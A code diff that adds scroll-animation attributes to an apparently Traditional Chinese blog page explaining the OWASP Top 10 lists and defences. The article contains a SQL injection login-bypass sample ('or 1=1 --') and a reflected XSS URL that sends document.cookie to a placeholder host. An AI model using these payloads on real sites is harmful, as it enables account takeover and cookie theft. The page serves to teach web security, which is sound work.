@@ -11,10 +11,10 @@
             </section>
 
             <section>
-                <div class="article-detail">
+                <div class="article-detail" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                     <h3>OWASP 簡介</h3>
                     <div class="article-detailLine"></div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <p>開放式 Web 應用程式安全性專案 (OWASP) 是致力於 Web 應用程式安全性的國際非營利組織。OWASP 的核心原則之一是，他們的所有資料都免費提供並且可以在其網站上輕鬆存取，這使得任何人都能夠改善自己的 Web 應用程式安全性。他們提供的材料包括文件、工具、影片和論壇。也許他們最著名的專案是 OWASP Top 10。</p>
                         <p>簡單的說就是推動世界軟體的安全性。OWASP 也歸納出容易攻擊的弱點並彙整為十大資安問題、排名、防範措施。</p>
                     </div>
@@ -22,32 +22,32 @@
             </section>
 
             <section>
-                <div class="article-detail">
+                <div class="article-detail" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                     <h3>OWASP 簡介</h3>
                     <div class="article-detailLine"></div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <p>開放式 Web 應用程式安全性專案 (OWASP) 是致力於 Web 應用程式安全性的國際非營利組織。OWASP 的核心原則之一是，他們的所有資料都免費提供並且可以在其網站上輕鬆存取，這使得任何人都能夠改善自己的 Web 應用程式安全性。他們提供的材料包括文件、工具、影片和論壇。也許他們最著名的專案是 OWASP Top 10。</p>
                     </div>
                 </div>
             </section>
             
             <section>
-                <div class="article-detail">
+                <div class="article-detail" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                     <h3>2017 OWASP TOP 10</h3>
                     <div class="article-detailLine"></div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <h4><i class="fa-solid fa-book-open"></i>A1 Injection 注入攻擊</h4>
                         <p>偷偷串改造成語意改變就是 Injection，SQL Injection 就是駭客透過修改 SQL 來改變他原本語意，達到竊取資料/破壞資料的行為。</p>
                         <p>以登入功能來說，若程式邏輯是只要輸入框滿足條件 (等於 true) 就可以拿到使用者資料，那駭客就算不需要知道使用者真實密碼也可以藉由 SQL Injection 輕易拿到使用者資料</p>
                     </div>
-                    <div class="article-coding">
+                    <div class="article-coding" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
 <pre>
 SELECT user_data FROM user_table
 WHERE user_name = "Charmy"
 AND paswword = "xx" or 1=1 --"
 </pre>
                     </div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <h4><i class="fa-solid fa-book-open"></i>A2 Broken Authentication 無效身分認證(認證及驗證機制失效)</h4>
                         <p>Cookie 就像一張通行證，通行證裡面會存有一組 Session ID 來驗證身份，而網站通常是認通行證的。</p>
                         <h5>網站登入時的身分認證有缺陷，導致駭客能竊取相關登入資訊</h5>
@@ -55,7 +55,7 @@ AND paswword = "xx" or 1=1 --"
                         <p>另外透過錯誤使用身份認證和會話(Session)管理功能，攻擊者能夠破解密碼或竊取 Session Token，或者利用其它開發漏洞來暫時性或永久性冒充其他用戶的身份。</p>
                         <p>Session 處理流程的最佳實踐有下列幾點</p>
                     </div>
-                    <div class="article-list">
+                    <div class="article-list" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <ul>
                             <li><i class="fa-solid fa-check"></i>確保用 HTTPS 連線，避免封包被監聽導致密碼外洩</li>
                             <li><i class="fa-solid fa-check"></i>Client 端的 validation 都是無用的，因為使用者可以透過開發者工具改變，所以 Server 端一定要再做一次驗證</li>
@@ -64,21 +64,21 @@ AND paswword = "xx" or 1=1 --"
                             <li><i class="fa-solid fa-check"></i>Session ID 不應該是固定不變且需要有時效性</li>
                         </ul>
                     </div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <h4><i class="fa-solid fa-book-open"></i>A3 Sensitive Data Exposure 敏感資料外洩(加密機制失效)</h4>
                         <h5>敏感資料保護度不足，使得駭客入侵系統後輕易竊取達成詐欺冒用等犯罪行為</h5>
                         <p>什麼是敏感資料？只要是不能公開的資料，就是敏感資料。</p>
                         <p>駭客可以用任何攻擊手法 XSS、SQL Injection、甚至只是在旁便等著你沒登出的電腦來讓敏感資料外洩</p>
                         <p>防護建議</p>
                     </div>
-                    <div class="article-list">
+                    <div class="article-list" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <ul>
                             <li><i class="fa-solid fa-check"></i>使用 SSL 加密連線進行資料傳輸</li>
                             <li><i class="fa-solid fa-check"></i>以加密、雜湊(hash)等方式保存敏感資料，例如帳號密碼</li>
                             <li><i class="fa-solid fa-check"></i>檢查系統防火牆規則設定，限制所需的連接埠，定期查看內部是否有對外大量不同目的 IP 之異常連線，與帳號活動。</li>
                         </ul>
                     </div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <h4><i class="fa-solid fa-book-open"></i>A4 XML External Entity, XML 外部處理器漏洞</h4>
                         <h5>以 XML 為基礎的網路應用程式沒有做好相關權限保護而造成機敏資料外洩的風險</h5>
                         <h4><i class="fa-solid fa-book-open"></i>A5 Broken Access Control 無效的存取控管(權限控制失效)</h4>
@@ -92,23 +92,23 @@ AND paswword = "xx" or 1=1 --"
                         <h5>當網站沒有做好的驗證，就可以讓駭客輕易輸入惡意程式碼在網站上</h5>
                         <p>Cross-Site Scripting 主要是利用在輸入欄位輸入 JS 的 script tag 來造成攻擊 又可以分為三種常見類型：</p>
                     </div>
-                    <div class="article-list">
+                    <div class="article-list" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <ul>
                             <li><i class="fa-solid fa-check"></i>Reflected</li>
                             <li><i class="fa-solid fa-check"></i>Persistent</li>
                             <li><i class="fa-solid fa-check"></i>DOM Based</li>
                         </ul>
                     </div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <h5><i class="fa-regular fa-note-sticky"></i>Reflected</h5>
                         <p>利用網址輸入欄來執行惡意程式碼，因為輸入當下馬上被執行所以稱為 Reflected XXS</p>
                     </div>
-                    <div class="article-codeNote">
+                    <div class="article-codeNote" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
 <pre>
 http://www.shop.com/search?query=&lt;script>document.location='http://xx?c='+document.cookie;&lt;/script>
 </pre>
                     </div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <p>藉由獲取的 document.cookie 登入使用者帳戶，然後拿信用卡盜刷或作任何他想做的事情</p>
                         <h5><i class="fa-regular fa-note-sticky"></i>Persistent/Stored XSS</h5>
                         <p>當使用者連到該網站便會遭受攻擊。不同的是惡意程式碼是被存到網站資料庫裡而不像 Reflected 是當下被輸入的</p>
@@ -117,14 +117,14 @@ http://www.shop.com/search?query=&lt;script>document.location='http://xx?c='+doc
                         <p>DOM Based XSS 跟 Reflect 非常像，唯一不同是 DOM Based 惡意程式碼沒有到 server 端被執行而是直接在 client 端就被執行</p>
                         <p>當應用程式缺乏適當的驗證，如允許網頁可出現不可信任的資訊時，或者是允許在使用者瀏覽器中執行腳本程式，恐導致有心人士劫持使用者 session、網頁置換或者是轉址到其他惡意網站等。</p>
                     </div>
-                    <div class="article-list">
+                    <div class="article-list" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <ul>
                             <li><i class="fa-solid fa-check"></i>可疑網址列 query</li>
                             <li><i class="fa-solid fa-check"></i>可疑表單，要重打帳密偷取資料</li>
                             <li><i class="fa-solid fa-check"></i>或是可以被轉址的網址 google.com 都要小心</li>
                         </ul>
                     </div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <h4><i class="fa-solid fa-book-open"></i>A8 Insecure Deserialization 不安全的反序列化漏洞</h4>
                         <h5>不安全的反序列化漏洞主要是鎖定 Java、PHP 或 Node.js 等常見的平臺。</h5>
                         <h4><i class="fa-solid fa-book-open"></i>A9 Using Components with Known Vulnerabilities 使用已有漏洞的元件(危險或過舊的元件)</h4>
@@ -134,11 +134,13 @@ http://www.shop.com/search?query=&lt;script>document.location='http://xx?c='+doc
             </section>
 
             <section>
-                <div class="article-detail">
+                <div class="article-detail" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                     <h3>2021 OWASP TOP 10</h3>
                     <div class="article-detailLine"></div>
-                    <div class="article-pic"><img src="../../assets/images/article-web/OWASP-2017-vs-2021.webp" alt=""></div>
-                    <div class="article-txt">
+                    <div class="article-pic" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
+                        <img src="../../assets/images/article-web/OWASP-2017-vs-2021.webp" alt="">
+                    </div>
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <h4><i class="fa-solid fa-book-open"></i>A1 Broken Access Control 權限控制失效</h4>
                         <p>94% 被測試的應用程式都有驗測到某種類別權限控制失效的問題。在權限控制失效這個類別中被對應到的 34 個 CWEs 在驗測資料中出現的次數都高於其他的弱點類別。</p>
                         <h4><i class="fa-solid fa-book-open"></i>A2 Sensitive Data Exposure 加密機制失效</h4>
@@ -164,10 +166,10 @@ http://www.shop.com/search?query=&lt;script>document.location='http://xx?c='+doc
             </section>
 
             <section>
-                <div class="article-detail">
+                <div class="article-detail" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                     <h3>2023 OWASP TOP 10 API Security Risks</h3>
                     <div class="article-detailLine"></div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <h4><i class="fa-solid fa-book-open"></i>A1 Broken Object Level Authorization 不安全的物件授權</h4>
                         <p>API 多半以公開方式處理物件識別，因此產生與物件存取控制相關的大範圍受攻擊面。OWASP建議物件授權應考慮在每項功能設計中，以防未授權的資訊洩露、資料被竄改或破壞。</p>
                         <h4><i class="fa-solid fa-book-open"></i>A2 Broken Authentication 無效身分認證</h4>
@@ -193,10 +195,10 @@ http://www.shop.com/search?query=&lt;script>document.location='http://xx?c='+doc
             </section>
 
             <section>
-                <div class="article-detail">
+                <div class="article-detail" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                     <h3>參考資料</h3>
                     <div class="article-detailLine"></div>
-                    <div class="article-txt">
+                    <div class="article-txt" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="150" data-aos-duration="1000">
                         <a class="article-reference" href="https://www.cloudflare.com/zh-tw/learning/security/threats/owasp-top-10/" target="_blank"><i class="fa-solid fa-pen-to-square"></i>Cloudflare - 什麼是 OWASP？什麼是 OWASP 十大漏洞？</a>
                         <a class="article-reference" href="https://medium.com/hannah-lin/%E5%B9%BC%E5%B9%BC%E7%8F%AD%E4%B9%9F%E8%83%BD%E6%87%82%E7%9A%84-owasp-top-10-692764c51f61#dd52" target="_blank"><i class="fa-solid fa-pen-to-square"></i>Medium(Written by Hannah Lin) - 幼幼班也能懂的 2017 OWASP TOP 10</a>
                         <a class="article-reference" href="https://medium.com/starbugs/%E7%86%B1%E9%A8%B0%E9%A8%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8E%92%E8%A1%8C-2021-owasp-top-10-a3fa783d718" target="_blank"><i class="fa-solid fa-pen-to-square"></i>Medium(Written by Hannah Lin) – 熱騰騰的漏洞排行榜 2021 OWASP TOP 10</a>
